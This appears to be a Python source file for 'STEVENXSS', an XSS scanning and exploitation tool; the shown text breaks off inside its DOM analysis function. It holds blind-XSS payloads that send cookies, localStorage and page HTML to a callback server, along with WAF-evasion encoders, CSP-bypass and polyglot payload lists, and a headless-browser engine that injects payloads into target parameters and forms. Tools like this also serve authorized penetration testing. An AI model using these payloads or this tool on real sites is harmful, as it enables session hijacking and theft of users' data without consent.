#!/usr/bin/env python3
"""
STEVENXSS v1.0 - Ultimate DOM XSS Scanner
Developer: STEVEN
Enhanced with Advanced Payload Engine & Exploit Verification
Now with full DOM XSS, Blind XSS, WAF Bypass, and CSP Bypass support
"""

import asyncio
import aiohttp
import argparse
import time
import urllib.parse
import random
import json
import re
import logging
import hashlib
from typing import List, Dict, Set, Optional, Any
from dataclasses import dataclass, asdict
from enum import Enum
import sys
import os
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib import colors
from reportlab.lib.units import inch
from playwright.async_api import async_playwright
import html
import base64
import uuid
import aiohttp.web

# =============================================
# ENHANCED TERMINAL UI AND DISPLAY
# =============================================

class TerminalColors:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class DisplayManager:
    """Enhanced terminal display management"""
    
    @staticmethod
    def print_banner():
        """Print professional banner"""
        banner = f"""
{TerminalColors.CYAN}{TerminalColors.BOLD}
╔════════════════════════════════════════════════════════════════╗
║                                                                ║
║    ███████╗████████╗███████╗██╗   ██╗███████╗███╗   ██╗██╗  ██╗║
║    ██╔════╝╚══██╔══╝██╔════╝██║   ██║██╔════╝████╗  ██║╚██╗██╔╝║
║    ███████╗   ██║   █████╗  ██║   ██║█████╗  ██╔██╗ ██║ ╚███╔╝ ║
║    ╚════██║   ██║   ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║ ██╔██╗ ║
║    ███████║   ██║   ███████╗ ╚████╔╝ ███████╗██║ ╚████║██╔╝ ██╗║
║    ╚══════╝   ╚═╝   ╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝║
║                                                                ║
║    {TerminalColors.YELLOW}🚀 STEVENXSS v1.0 - ULTIMATE EDITION{TerminalColors.CYAN}              ║
║    {TerminalColors.WHITE}Advanced DOM XSS Scanner with Exploit Verification{TerminalColors.CYAN}    ║
║    Developer: STEVEN | Kali Linux Optimized{TerminalColors.CYAN}                 ║
║    {TerminalColors.GREEN}✅ Full DOM XSS, Blind XSS, WAF & CSP Bypass Support{TerminalColors.CYAN}   ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝
{TerminalColors.END}
"""
        print(banner)
    
    @staticmethod
    def print_section(title):
        """Print section header"""
        print(f"\n{TerminalColors.BLUE}{TerminalColors.BOLD}╔═{'═' * (len(title) + 2)}═╗{TerminalColors.END}")
        print(f"{TerminalColors.BLUE}{TerminalColors.BOLD}║  {title}  ║{TerminalColors.END}")
        print(f"{TerminalColors.BLUE}{TerminalColors.BOLD}╚═{'═' * (len(title) + 2)}═╝{TerminalColors.END}")
    
    @staticmethod
    def print_info(message):
        """Print info message"""
        print(f"{TerminalColors.CYAN}[ℹ] {message}{TerminalColors.END}")
    
    @staticmethod
    def print_success(message):
        """Print success message"""
        print(f"{TerminalColors.GREEN}[✓] {message}{TerminalColors.END}")
    
    @staticmethod
    def print_warning(message):
        """Print warning message"""
        print(f"{TerminalColors.YELLOW}[!] {message}{TerminalColors.END}")
    
    @staticmethod
    def print_error(message):
        """Print error message"""
        print(f"{TerminalColors.RED}[✗] {message}{TerminalColors.END}")
    
    @staticmethod
    def print_critical(message):
        """Print critical message"""
        print(f"{TerminalColors.RED}{TerminalColors.BOLD}[💀] {message}{TerminalColors.END}")
    
    @staticmethod
    def print_exploit_success(message):
        """Print exploit success message"""
        print(f"{TerminalColors.GREEN}{TerminalColors.BOLD}[💥] {message}{TerminalColors.END}")
    
    @staticmethod
    def print_exploit_fail(message):
        """Print exploit fail message"""
        print(f"{TerminalColors.RED}[💥] {message}{TerminalColors.END}")
    
    @staticmethod
    def print_progress(current, total, param, payload):
        """Print progress indicator"""
        percentage = (current / total) * 100 if total > 0 else 0
        payload_display = payload[:50] + "..." if len(payload) > 50 else payload
        print(f"{TerminalColors.WHITE}[{current}/{total}] {percentage:.1f}% - Testing: {param} -> {payload_display}{TerminalColors.END}", end='\r')
    
    @staticmethod
    def print_vulnerability(result):
        """Print vulnerability discovery in a formatted way"""
        level_colors = {
            "critical": TerminalColors.RED,
            "high": TerminalColors.YELLOW,
            "medium": TerminalColors.MAGENTA,
            "low": TerminalColors.BLUE
        }
        
        level_color = level_colors.get(result.level.value, TerminalColors.WHITE)
        level_icon = "💀" if result.level.value == "critical" else "⚠️" if result.level.value == "high" else "🔍" if result.level.value == "medium" else "ℹ"
        
        print(f"\n{TerminalColors.RED}{TerminalColors.BOLD}┌─── XSS VULNERABILITY DETECTED ───{TerminalColors.END}")
        print(f"{TerminalColors.RED}│ {TerminalColors.END}")
        print(f"{TerminalColors.RED}│ {level_icon} {level_color}{result.level.value.upper():<9}{TerminalColors.RED} {TerminalColors.CYAN}Parameter: {TerminalColors.WHITE}{result.parameter}{TerminalColors.END}")
        print(f"{TerminalColors.RED}│ {TerminalColors.CYAN}Context:    {TerminalColors.WHITE}{result.context.value}{TerminalColors.END}")
        print(f"{TerminalColors.RED}│ {TerminalColors.CYAN}Confidence: {TerminalColors.WHITE}{result.confidence:.1f}%{TerminalColors.END}")
        print(f"{TerminalColors.RED}│ {TerminalColors.CYAN}Payload:    {TerminalColors.WHITE}{result.payload}{TerminalColors.END}")
        print(f"{TerminalColors.RED}│ {TerminalColors.CYAN}URL:        {TerminalColors.WHITE}{result.url}{TerminalColors.END}")
        print(f"{TerminalColors.RED}└──────────────────────────────────{TerminalColors.END}")

# Configure advanced logging
logging.basicConfig(
    level=logging.INFO,
    format=f'{TerminalColors.WHITE}%(asctime)s - %(name)s - %(levelname)s - %(message)s{TerminalColors.END}',
    handlers=[
        logging.FileHandler('stevenxss_advanced.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('STEVENXSSv2.4')

# =============================================
# ENHANCED CORE CLASSES
# =============================================

class ScanContext(Enum):
    HTML = "html"
    ATTRIBUTE = "attribute"
    JAVASCRIPT = "javascript"
    URL = "url"
    DOM = "dom"
    HASH = "location_hash"
    UNKNOWN = "unknown"

class VulnerabilityLevel(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

@dataclass
class ExploitResult:
    """Results from exploit verification"""
    successful: bool = False
    evidence: str = ""
    execution_context: str = ""
    screenshot_path: str = ""
    response_data: Dict = None
    error_message: str = ""

@dataclass
class ScanResult:
    url: str
    parameter: str
    payload: str
    context: ScanContext
    level: VulnerabilityLevel
    reflection_data: Dict
    dom_analysis: Optional[Dict] = None
    http_status: int = 200
    timestamp: str = ""
    confidence: float = 0.0
    exploit_result: Optional[ExploitResult] = None

@dataclass
class PayloadEffectiveness:
    payload: str
    success_count: int = 0
    total_tests: int = 0
    contexts: Set[ScanContext] = None
    success_rate: float = 0.0
    
    def __post_init__(self):
        if self.contexts is None:
            self.contexts = set()
        self._update_success_rate()
    
    def _update_success_rate(self):
        if self.total_tests > 0:
            self.success_rate = (self.success_count / self.total_tests) * 100
        else:
            self.success_rate = 0.0

# =============================================
# BLIND XSS INTEGRATION WITH CALLBACK SERVER
# =============================================

class BlindXSSIntegration:
    """Blind XSS integration with callback server support"""
    
    def __init__(self, callback_url: str = None):
        self.callback_url = callback_url or f"http://localhost:8080/{uuid.uuid4().hex}"
        self.callback_id = uuid.uuid4().hex[:8]
        self.detected_callbacks = []
        self.runner = None
        self.site = None
    
    async def start_server(self):
        """Start a simple HTTP server to receive callbacks"""
        try:
            from aiohttp import web
            
            async def handle_callback(request):
                callback_data = {
                    'timestamp': time.time(),
                    'method': request.method,
                    'path': str(request.path),
                    'query_string': str(request.query_string),
                    'headers': dict(request.headers),
                    'remote': str(request.remote),
                    'data': await request.text() if request.method == 'POST' else ''
                }
                
                self.detected_callbacks.append(callback_data)
                DisplayManager.print_success(f"Blind XSS callback received from {request.remote}")
                DisplayManager.print_info(f"Callback data: {callback_data}")
                
                return web.Response(text="OK")
            
            app = web.Application()
            app.router.add_get('/{tail:.*}', handle_callback)
            app.router.add_post('/{tail:.*}', handle_callback)
            
            self.runner = web.AppRunner(app)
            await self.runner.setup()
            self.site = web.TCPSite(self.runner, '0.0.0.0', 8080)
            await self.site.start()
            
            DisplayManager.print_success(f"Blind XSS callback server started at {self.callback_url}")
            return True
            
        except Exception as e:
            DisplayManager.print_error(f"Failed to start Blind XSS callback server: {str(e)}")
            return False
    
    async def stop_server(self):
        """Stop the callback server"""
        try:
            if self.site:
                await self.site.stop()
            if self.runner:
                await self.runner.cleanup()
            DisplayManager.print_success("Blind XSS callback server stopped")
        except Exception as e:
            DisplayManager.print_error(f"Error stopping callback server: {str(e)}")
    
    def generate_blind_payloads(self) -> List[str]:
        """Generate payloads that call back to a server"""
        return [
            f'<script>fetch("{self.callback_url}?id={self.callback_id}&cookie="+btoa(document.cookie))</script>',
            f'<img src=x onerror="fetch(\'{self.callback_url}?id={self.callback_id}&url=\'+btoa(document.location))">',
            f'<script>var x=new XMLHttpRequest();x.open("GET","{self.callback_url}?id={self.callback_id}&data="+btoa(document.body.innerHTML));x.send();</script>',
            f'<img src="{self.callback_url}?id={self.callback_id}">',
            f'<script src="{self.callback_url}/xss.js"></script>',
            f'<link rel="stylesheet" href="{self.callback_url}?id={self.callback_id}">',
            f'<iframe src="{self.callback_url}?id={self.callback_id}"></iframe>',
            f'<form action="{self.callback_url}" method="post"><input name="id" value="{self.callback_id}"><input name="data"></form>',
            f'<script>navigator.sendBeacon("{self.callback_url}", "id={self.callback_id}&data="+btoa(localStorage));</script>'
        ]
    
    def check_callback_detection(self) -> bool:
        """Check if any callbacks were detected"""
        return len(self.detected_callbacks) > 0

# =============================================
# WAF BYPASS ENGINE WITH CSP BYPASS
# =============================================

class WAFBypassEngine:
    """Advanced WAF bypass engine with CSP bypass techniques"""
    
    def __init__(self):
        self.bypass_techniques = [
            'url_encoding',
            'html_encoding', 
            'unicode_encoding',
            'base64_encoding',
            'hex_encoding',
            'double_url_encoding',
            'mixed_case',
            'comment_obfuscation',
            'tab_newline_injection',
            'null_byte_injection'
        ]
    
    def generate_encoded_payloads(self, payload: str) -> List[str]:
        """Generate encoded variations of a payload for WAF bypass"""
        encoded_payloads = []
        
        # URL encoding
        encoded_payloads.append(urllib.parse.quote(payload))
        encoded_payloads.append(urllib.parse.quote(urllib.parse.quote(payload)))  # Double URL encoding
        
        # HTML encoding
        encoded_payloads.append(html.escape(payload).replace('&lt;', '<').replace('&gt;', '>'))
        
        # Unicode encoding
        unicode_encoded = ''.join([f'\\u{ord(c):04x}' for c in payload])
        encoded_payloads.append(unicode_encoded)
        
        # Base64 encoding
        try:
            base64_encoded = base64.b64encode(payload.encode()).decode()
            encoded_payloads.append(base64_encoded)
        except:
            pass
        
        # Hex encoding
        hex_encoded = ''.join([f'%{ord(c):02x}' for c in payload])
        encoded_payloads.append(hex_encoded)
        
        # Mixed case
        mixed_case = ''.join([c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)])
        encoded_payloads.append(mixed_case)
        
        # Comment obfuscation
        commented = payload.replace('<', '</*/*/').replace('>', '/*/*/>')
        encoded_payloads.append(commented)
        
        # Tab and newline injection
        tab_injected = payload.replace(' ', '\t').replace('=', '\n=')
        encoded_payloads.append(tab_injected)
        
        # Null byte injection
        null_byte = payload.replace('>', '\x00>')
        encoded_payloads.append(null_byte)
        
        return list(set([p for p in encoded_payloads if p]))
    
    def generate_polyglot_payloads(self) -> List[str]:
        """Generate polyglot payloads that work in multiple contexts"""
        polyglots = [
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/`/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "'\";--> </script><svg onload=alert(1)>",
            "`\"'><img src=x onerror=alert(1)>",
            "</script><script>alert(1)</script>",
            "<!--<img src=x onerror=alert(1)>-->",
            "<?xml version=\"1.0\"><img src=x onerror=alert(1)>",
            "[[\"'`]]; alert(1); //",
            "'; alert(1); var x='",
            "`; alert(1); //",
            '"; alert(1); //'
        ]
        return polyglots
    
    def generate_csp_bypass_payloads(self) -> List[str]:
        """Generate payloads that bypass Content Security Policy"""
        return [
            "<img src=x onerror=\"javascript:alert(1)\">",  # Bypass CSP with javascript: URL
            "<svg><script>alert(1)</script></svg>",        # SVG-based XSS
            "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",  # iframe srcdoc
            "<script nonce='random'>alert(1)</script>",   # Nonce-based CSP bypass
            "<script>eval('al'+'ert(1)')</script>",        # Eval-based bypass
            "<script>window['al'+'ert'](1)</script>",      # Obfuscated alert
            "<img src=x onerror=\"window['al'+'ert'](1)\">",  # Obfuscated onerror
            "<script>Function('ale'+'rt(1)')()</script>",  # Function constructor
            "<img src=x onerror=\"import('data:text/javascript,alert(1)')\">",  # Dynamic import
            "<object data=\"javascript:alert(1)\"></object>",  # Object tag
            "<embed src=\"javascript:alert(1)\">",         # Embed tag
            "<base href=\"javascript:alert(1)//\">",       # Base tag
            "<form><button formaction=\"javascript:alert(1)\">X</button></form>",  # Form action
            "<math href=\"javascript:alert(1)\">CLICKME</math>",  # MathML
            "<link rel=import href=\"javascript:alert(1)\">",  # HTML imports
            "<meta http-equiv=\"refresh\" content=\"0;javascript:alert(1)\">",  # Meta refresh
        ]

# =============================================
# EXPLOIT VERIFICATION ENGINE - ENHANCED VERSION
# =============================================

class ExploitVerificationEngine:
    """Enhanced engine for verifying XSS exploitation with actual execution detection"""
    
    def __init__(self):
        self.success_indicators = [
            'alert_executed',
            'script_executed', 
            'dom_modified',
            'element_created',
            'error_triggered',
            'location_hash_reflected',
            'csp_bypassed'
        ]
    
    async def verify_exploit(self, url: str, parameter: str, exploit_payload: str, 
                           method: str = 'GET', post_data: Dict = None) -> ExploitResult:
        """Verify if exploit payload successfully executes in the actual target"""
        result = ExploitResult()
        
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,
                    args=[
                        '--no-sandbox',
                        '--disable-web-security',
                        '--disable-features=VizDisplayCompositor'
                    ]
                )
                context = await browser.new_context()
                page = await context.new_page()
                
                # Set up detection for various execution indicators
                execution_detected = asyncio.Event()
                execution_evidence = {
                    'alert_detected': False,
                    'alert_message': None,
                    'script_executed': False,
                    'dom_modified': False,
                    'element_created': False,
                    'error_triggered': False,
                    'payload_reflected': False,
                    'location_hash_reflected': False,
                    'console_logs': [],
                    'network_requests': []
                }
                
                def handle_alert(dialog):
                    execution_evidence['alert_detected'] = True
                    execution_evidence['alert_message'] = dialog.message
                    execution_detected.set()
                    asyncio.create_task(dialog.dismiss())
                
                page.on("dialog", handle_alert)
                
                # Monitor console for errors and logs
                def handle_console(msg):
                    execution_evidence['console_logs'].append({
                        'type': msg.type,
                        'text': msg.text,
                        'location': str(msg.location)
                    })
                    if msg.type == 'error':
                        execution_evidence['error_triggered'] = True
                        execution_detected.set()
                    # Also detect if alert is mentioned in console (indirect execution)
                    if 'alert' in msg.text.lower() and any(word in msg.text.lower() for word in ['executed', 'called', 'triggered']):
                        execution_evidence['script_executed'] = True
                        execution_detected.set()
                
                page.on("console", handle_console)
                
                # Monitor network requests
                def handle_request(request):
                    execution_evidence['network_requests'].append({
                        'url': request.url,
                        'method': request.method,
                        'headers': request.headers
                    })
                
                page.on("request", handle_request)
                
                try:
                    # Prepare the exploit URL/data - HANDLE location.hash SPECIALLY
                    if parameter == 'location_hash':
                        # For location.hash, we need to construct the URL differently
                        base_url = url.split('#')[0]
                        exploit_url = f"{base_url}#{exploit_payload}"
                        await page.goto(exploit_url, wait_until="networkidle", timeout=15000)
                        
                        # Special check for location.hash reflection and execution
                        hash_check = await page.evaluate("""
                            () => {
                                const hash = window.location.hash;
                                const results = {
                                    hash_reflected: hash.length > 1,
                                    hash_value: hash,
                                    dom_elements_created: false,
                                    scripts_executed: false
                                };
                                
                                // Check if payload created DOM elements
                                const suspiciousElements = document.querySelectorAll('img[src=\"x\"], svg, iframe, script');
                                if (suspiciousElements.length > 0) {
                                    results.dom_elements_created = true;
                                }
                                
                                // Check for script execution indicators
                                if (document.body.innerHTML.includes('onerror') || 
                                    document.body.innerHTML.includes('onload') ||
                                    document.body.innerHTML.includes('javascript:')) {
                                    results.scripts_executed = true;
                                }
                                
                                return results;
                            }
                        """)
                        
                        if hash_check['hash_reflected']:
                            execution_evidence['location_hash_reflected'] = True
                            execution_evidence['payload_reflected'] = True
                        
                        if hash_check['dom_elements_created'] or hash_check['scripts_executed']:
                            execution_evidence['script_executed'] = True
                            execution_evidence['dom_modified'] = True
                    
                    else:
                        exploit_url, exploit_data = self._prepare_exploit(
                            url, parameter, exploit_payload, method, post_data
                        )
                        
                        # Navigate to the exploit URL
                        if method.upper() == 'GET':
                            await page.goto(exploit_url, wait_until="networkidle", timeout=15000)
                        else:
                            await page.goto(url, wait_until="networkidle", timeout=15000)
                            if exploit_data:
                                # For POST requests, submit the form
                                await self._submit_post_exploit(page, parameter, exploit_payload, exploit_data)
                    
                    # Wait for potential JavaScript execution (INCREASED DELAY)
                    await asyncio.sleep(3)
                    
                    # Check for various execution indicators
                    execution_evidence.update(await self._check_execution_indicators(page, exploit_payload))
                    
                    # Determine if exploit was successful based on actual execution
                    result.successful = self._determine_exploit_success(execution_evidence, parameter)
                    
                    if result.successful:
                        result.evidence = self._format_evidence(execution_evidence)
                        result.execution_context = self._determine_execution_context(execution_evidence, parameter)
                        DisplayManager.print_exploit_success(f"EXPLOIT SUCCESS - {result.evidence}")
                    else:
                        result.error_message = "No execution indicators detected"
                        # Log detailed failure information for debugging
                        logger.debug(f"Exploit failed - Evidence: {execution_evidence}")
                        DisplayManager.print_exploit_fail(f"EXPLOIT FAILED - {result.error_message}")
                    
                    # Take screenshot as evidence
                    timestamp = int(time.time())
                    screenshot_path = f"exploit_evidence_{timestamp}.png"
                    await page.screenshot(path=screenshot_path)
                    result.screenshot_path = screenshot_path
                    
                    # Capture response data
                    result.response_data = {
                        'url': page.url,
                        'title': await page.title(),
                        'execution_evidence': execution_evidence
                    }
                    
                    await browser.close()
                    
                except Exception as e:
                    result.error_message = f"Exploit verification failed: {str(e)}"
                    DisplayManager.print_exploit_fail(f"Exploit verification failed: {str(e)}")
                    await browser.close()
                    
        except Exception as e:
            result.error_message = f"Browser initialization failed: {str(e)}"
            DisplayManager.print_exploit_fail(f"Browser initialization failed: {str(e)}")
        
        return result
    
    def _prepare_exploit(self, url: str, parameter: str, exploit_payload: str, 
                        method: str, post_data: Dict = None) -> tuple[str, Dict]:
        """Prepare exploit URL or data"""
        if method.upper() == 'GET':
            parsed = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed.query)
            
            if parameter in query_params:
                query_params[parameter] = [exploit_payload]
            else:
                query_params[parameter] = [exploit_payload]
            
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            exploit_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))
            
            return exploit_url, None
        else:
            # For POST requests
            exploit_data = post_data.copy() if post_data else {}
            exploit_data[parameter] = exploit_payload
            return url, exploit_data
    
    async def _submit_post_exploit(self, page, parameter: str, exploit_payload: str, exploit_data: Dict):
        """Submit POST exploit data"""
        try:
            # Try to find and fill the appropriate form element
            selector = f"textarea[name='{parameter}'], input[name='{parameter}'], [name='{parameter}']"
            elements = await page.query_selector_all(selector)
            
            if elements:
                for element in elements:
                    await element.fill(exploit_payload)
                    # Try to find and click submit button
                    submit_selector = "input[type='submit'], button[type='submit'], form input[type='submit'], form button"
                    submit_buttons = await page.query_selector_all(submit_selector)
                    if submit_buttons:
                        await submit_buttons[0].click()
                        await asyncio.sleep(2)
                        break
        except Exception as e:
            logger.debug(f"POST exploit submission failed: {str(e)}")
    
    async def _check_execution_indicators(self, page, exploit_payload: str) -> Dict[str, Any]:
        """Check for various execution indicators"""
        indicators = {
            'alert_detected': False,
            'script_executed': False,
            'dom_modified': False,
            'element_created': False,
            'error_triggered': False,
            'payload_reflected': False
        }
        
        try:
            # Check for DOM modifications and script execution
            dom_check = await page.evaluate("""
                (payload) => {
                    const results = {
                        script_tags_modified: document.querySelectorAll('script').length > 0,
                        images_with_error: document.querySelectorAll('img[src=\"x\"]').length > 0,
                        svg_elements: document.querySelectorAll('svg').length > 0,
                        iframe_elements: document.querySelectorAll('iframe').length > 0,
                        script_execution: false,
                        dom_modification: false,
                        element_creation: false
                    };

                    // Check if payload created new elements
                    const allElements = document.querySelectorAll('*');
                    for (let element of allElements) {
                        if (element.outerHTML && element.outerHTML.includes(payload)) {
                            results.element_creation = true;
                            break;
                        }
                    }

                    // Check for script execution by looking for modified DOM
                    if (document.body.innerHTML.includes(payload) || 
                        document.documentElement.outerHTML.includes(payload)) {
                        results.dom_modification = true;
                    }

                    return results;
                }
            """, exploit_payload)
            
            indicators.update(dom_check)
            
            # Check if payload is reflected in DOM (proves execution context)
            payload_reflected = await page.evaluate("""
                (payload) => {
                    return document.documentElement.outerHTML.includes(payload) || 
                           document.body.innerHTML.includes(payload);
                }
            """, exploit_payload)
            
            indicators['payload_reflected'] = payload_reflected
            
            # Check for specific execution patterns
            execution_check = await page.evaluate("""
                () => {
                    // Check for common XSS execution patterns
                    const patterns = {
                        has_onerror_handlers: document.querySelectorAll('[onerror]').length > 0,
                        has_onclick_handlers: document.querySelectorAll('[onclick]').length > 0,
                        has_onmouseover_handlers: document.querySelectorAll('[onmouseover]').length > 0,
                        has_javascript_urls: document.querySelectorAll('[href^=\"javascript:\"]').length > 0,
                        has_suspicious_src: document.querySelectorAll('img[src=\"x\"]').length > 0
                    };
                    return patterns;
                }
            """)
            
            # If any suspicious patterns exist, consider it potential execution
            if any(execution_check.values()):
                indicators['script_executed'] = True
            
        except Exception as e:
            logger.debug(f"Execution indicators check failed: {str(e)}")
        
        return indicators
    
    def _determine_exploit_success(self, evidence: Dict, parameter: str) -> bool:
        """Determine if exploit was truly successful based on execution evidence"""
        
        # High confidence indicators
        if evidence.get('alert_detected'):
            return True
        
        # For location.hash, different success criteria
        if parameter == 'location_hash':
            if evidence.get('location_hash_reflected') and (evidence.get('script_executed') or evidence.get('dom_modified')):
                return True
            if evidence.get('element_created') and evidence.get('payload_reflected'):
                return True
        
        # Medium confidence indicators for other parameters
        if evidence.get('script_executed') and evidence.get('payload_reflected'):
            return True
        
        # DOM modification with payload reflection
        if evidence.get('dom_modified') and evidence.get('payload_reflected'):
            return True
        
        # Element creation with payload
        if evidence.get('element_created') and evidence.get('payload_reflected'):
            return True
        
        # Error triggered during execution
        if evidence.get('error_triggered') and evidence.get('payload_reflected'):
            return True
        
        return False
    
    def _format_evidence(self, evidence: Dict) -> str:
        """Format execution evidence for reporting"""
        evidence_parts = []
        
        if evidence.get('alert_detected'):
            evidence_parts.append(f"Alert executed: {evidence.get('alert_message', 'Unknown')}")
        
        if evidence.get('script_executed'):
            evidence_parts.append("JavaScript executed")
        
        if evidence.get('dom_modified'):
            evidence_parts.append("DOM modified")
        
        if evidence.get('element_created'):
            evidence_parts.append("New elements created")
        
        if evidence.get('error_triggered'):
            evidence_parts.append("Execution errors detected")
        
        if evidence.get('payload_reflected'):
            evidence_parts.append("Payload reflected in DOM")
        
        if evidence.get('location_hash_reflected'):
            evidence_parts.append("Location.hash reflected")
        
        return "; ".join(evidence_parts) if evidence_parts else "No clear execution evidence"
    
    def _determine_execution_context(self, evidence: Dict, parameter: str) -> str:
        """Determine the execution context based on evidence"""
        if evidence.get('alert_detected'):
            return "javascript_alert"
        elif evidence.get('script_executed'):
            return "script_execution"
        elif evidence.get('dom_modified'):
            return "dom_modification"
        elif evidence.get('element_created'):
            return "element_creation"
        elif evidence.get('error_triggered'):
            return "error_execution"
        elif evidence.get('location_hash_reflected'):
            return "location_hash_execution"
        else:
            return "unknown"

# =============================================
# CORE SCANNER CLASSES - ENHANCED
# =============================================

class AsyncHTTPClient:
    def __init__(self, max_concurrency: int = 50, timeout: int = 30):
        self.max_concurrency = max_concurrency
        self.timeout = timeout
        self.session = None
        self.semaphore = asyncio.Semaphore(max_concurrency)
        
    async def __aenter__(self):
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        connector = aiohttp.TCPConnector(limit=self.max_concurrency, verify_ssl=False)
        self.session = aiohttp.ClientSession(timeout=timeout, connector=connector)
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def get(self, url: str, headers: Dict = None) -> tuple[int, str, Dict]:
        async with self.semaphore:
            try:
                async with self.session.get(url, headers=headers, ssl=False) as response:
                    text = await response.text()
                    return response.status, text, dict(response.headers)
            except aiohttp.ClientError as e:
                logger.error(f"Request failed for {url}: {str(e)}")
                return 0, "", {}
            except asyncio.TimeoutError:
                logger.error(f"Request timed out for {url}")
                return 0, "", {}
            except Exception as e:
                logger.error(f"Unexpected error for {url}: {str(e)}")
                return 0, "", {}
    
    async def post(self, url: str, data: Dict, headers: Dict = None) -> tuple[int, str, Dict]:
        async with self.semaphore:
            try:
                async with self.session.post(url, data=data, headers=headers, ssl=False) as response:
                    text = await response.text()
                    return response.status, text, dict(response.headers)
            except aiohttp.ClientError as e:
                logger.error(f"POST request failed for {url}: {str(e)}")
                return 0, "", {}
            except asyncio.TimeoutError:
                logger.error(f"POST request timed out for {url}")
                return 0, "", {}
            except Exception as e:
                logger.error(f"Unexpected POST error for {url}: {str(e)}")
                return 0, "", {}

class AdvancedDOMAnalyzer:
    def __init__(self):
        self.sources = [
            'location.href', 'location.search', 'location.hash', 'document.URL',
            'document.documentURI', 'document.referrer', 'window.name', 
            'document.baseURI', 'document.cookie', 'localStorage', 'sessionStorage',
            'location.hostname', 'location.pathname', 'performance.navigation',
            'history.state', 'document.title', 'URLSearchParams'
        ]
        self.sinks = [
            'eval', 'Function', 'setTimeout', 'setInterval', 'setImmediate',
            'innerHTML', 'outerHTML', 'insertAdjacentHTML', 'document.write', 
            'document.writeln', 'window.location', 'location.assign',
            'location.replace', 'document.domain', 'element.src', 'element.href',
            'element.setAttribute', 'element.innerHTML', 'element.outerHTML',
            'document.createElement', 'DOMParser.parseFromString'
        ]
    
    async def analyze_dom_environment(self, url: str) -> Dict[str, Any]:
        """Comprehensive DOM environment analysis"""
        DisplayManager.print_info("Starting DOM environment analysis...")
        dom_analysis = {
            'sources': [],
            'sinks': [],
            'event_listeners': [],
            'dynamic_scripts': [],
            'dangerous_functions': [],
            'url_manipulations': [],
            'vulnerabilities': []
        }
        
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,
                    args=[
                        '--no-sandbox',
                        '--disable-web-security',
                        '--disable-features=VizDisplayCompositor',
                        '--disable-background-timer-throttling',
                        '--disable-renderer-backgrounding'
                    ]
                )
                context = await browser.new_context()
                page = await context.new_page()
                
                try:
                    await page.goto(url, wait_until="networkidle", timeout=30000)
                    
                    analysis_result = await page.evaluate("""
                        () => {
                            const results = {
                                sources: [],
                                sinks: [],
                                eventListeners: [],
                                dynamicScripts: [],
                                dangerousFunctions: [],
                                urlManipulations: []
                            };

                            const sourceChecks = [
                                {name: 'location.href', value: location.href},
                                {name: 'location.search', value: location.search},
                                {name: 'location.hash', value: location.hash},
                                {name: 'document.URL', value: document.URL},
                                {name: 'document.referrer', value: document.referrer},
                                {name: 'window.name', value: window.name},
                                {name: 'document.cookie', value: document.cookie},
                                {name: 'localStorage', value: JSON.stringify(localStorage)},
                                {name: 'sessionStorage', value: JSON.stringify(sessionStorage)}
                            ];

                            sourceChecks.forEach(source => {
                                if (source.value && source.value.length > 0) {
                                    results.sources.push({
                                        type: 'source',
                                        name: source.name,
                                        value: source.value.substring(0, 200),
                                        dangerous: source.value.includes('script') || 
                                                  source.value.includes('<') || 
                                                  source.value.includes('>')
                                    });
                                }
                            });

                            const elements = document.querySelectorAll('*');
                            elements.forEach(element => {
                                if (element.innerHTML && element.innerHTML.length > 0) {
                                    results.sinks.push({
                                        type: 'sink',
                                        name: 'innerHTML',
                                        element: element.tagName,
                                        value: element.innerHTML.substring(0, 100),
                                        dangerous: element.innerHTML.includes('script') ||
                                                  element.innerHTML.includes('onload') ||
                                                  element.innerHTML.includes('javascript:')
                                    });
                                }

                                const attributes = element.attributes;
                                for (let attr of attributes) {
                                    if (attr.name.startsWith('on') && attr.value) {
                                        results.eventListeners.push({
                                            element: element.tagName,
                                            event: attr.name,
                                            handler: attr.value.substring(0, 100),
                                            dangerous: attr.value.includes('location') || 
                                                      attr.value.includes('eval') ||
                                                      attr.value.includes('document.write')
                                        });
                                    }
                                }

                                const dangerousAttrs = ['src', 'href', 'action', 'formaction'];
                                dangerousAttrs.forEach(attr => {
                                    const value = element.getAttribute(attr);
                                    if (value && (value.includes('javascript:') || 
                                                 value.includes('data:') || 
                                                 value.includes('vbscript:'))) {
                                        results.sinks.push({
                                            type: 'sink',
                                            name: attr,
                                            element: element.tagName,
                                            value: value,
                                            dangerous: true
                                        });
                                    }
                                });
                            });

                            return results;
                        }
                    """)
                    
                    if analysis_result:
                        dom_analysis.update(analysis_result)
                    
                    DisplayManager.print_info("Testing DOM XSS payloads...")
                    dom_vulnerabilities = await self._test_dom_payloads(page, url)
                    dom_analysis['vulnerabilities'] = dom_vulnerabilities
                    
                    await browser.close()
                    
                except Exception as e:
                    logger.error(f"DOM analysis failed for {url}: {str(e)}")
                    await browser.close()
        
        except Exception as e:
            logger.error(f"Playwright initialization failed: {str(e)}")
        
